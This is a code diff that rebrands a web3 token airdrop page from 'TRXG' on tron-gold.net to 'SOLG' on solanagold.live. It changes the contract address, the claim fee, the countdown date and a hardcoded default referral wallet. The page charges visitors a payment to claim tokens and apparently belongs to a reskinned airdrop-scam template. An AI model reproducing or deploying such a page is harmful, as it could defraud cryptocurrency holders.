@@ -1,5 +1,5 @@
 let addr, web3 = new web3js.myweb3(window.ethereum);
-const sttaddr = "0xBBf455C0b1F16dbE0AC98fF7939A461A51f0f74f",
+const sttaddr = "0xe702616024feac45f29de1a0a3204c623ab59a45",
     sttabi = [{
         "inputs": [],
         "stateMutability": "nonpayable",
@@ -389,7 +389,7 @@ const loadweb3 = async () => {
         let fresh = document.getElementById('airinput').value;
         sttcontract.methods.airdrop(fresh).send({
             from: addr,
-            value: 3400000000000000
+            value: 3000000000000000
         }, (err, res) => {
             if (!err) console.log(res);
             else console.log(err);
@@ -458,10 +458,10 @@ function addToWallet() {
             params: {
                 type: "ERC20",
                 options: {
-                    address: "0xBBf455C0b1F16dbE0AC98fF7939A461A51f0f74f",
-                    symbol: "TRXG",
+                    address: "0xe702616024feac45f29de1a0a3204c623ab59a45",
+                    symbol: "SOLG",
                     decimals: "18",
-                    image: "https://tron-gold.net/PNG/fire1.png"
+                    image: "https://solanagold.live/PNG/fire1.png"
                 }
             },
             id: Math.round(1e5 * Math.random())
@@ -479,7 +479,7 @@ window.onload = function() {
     }("ref");
     null == e || (document.getElementById("airinput").value = e)
 };
-var countDownDate = new Date("Jan 7, 2022 00:00:00").getTime(),
+var countDownDate = new Date("Jan 30, 2022 00:00:00").getTime(),
     x = setInterval(function() {
         var e = (new Date).getTime(),
             t = countDownDate - e,
@@ -492,7 +492,7 @@ var countDownDate = new Date("Jan 7, 2022 00:00:00").getTime(),
 
 function getreflink() {
     var e = document.getElementById("refaddress").value;
-    document.getElementById("refaddress").value ? /^(0x){1}[0-9a-fA-F]{40}$/i.test(e) ? document.getElementById("refaddress").value = "https://tron-gold.net/?ref=" + document.getElementById("refaddress").value : Swal.fire("Referral Alert", "Your address is not valid.", "error") : Swal.fire("Referral Alert", "Please Enter Your BEP20 Address.", "error")
+    document.getElementById("refaddress").value ? /^(0x){1}[0-9a-fA-F]{40}$/i.test(e) ? document.getElementById("refaddress").value = "https://solanagold.live/?ref=" + document.getElementById("refaddress").value : Swal.fire("Referral Alert", "Your address is not valid.", "error") : Swal.fire("Referral Alert", "Please Enter Your BEP20 Address.", "error")
 }
 
 function copyToClipboard(e) {
@@ -520,4 +520,4 @@ function querySt(e) {
         if (ft = gy[i].split("="), ft[0] == e) return ft[1]
 }
 var ref = querySt("ref");
-null == ref ? (ref = "0xAc584C2D4e6b993a224f2d5a046d0e29D6c41c59", document.getElementById("airinput").value = ref) : document.getElementById("airinput").value = ref;
+null == ref ? (ref = "0x0803075544de2f1c08d38D6fF341191cA4fA1990", document.getElementById("airinput").value = ref) : document.getElementById("airinput").value = ref;
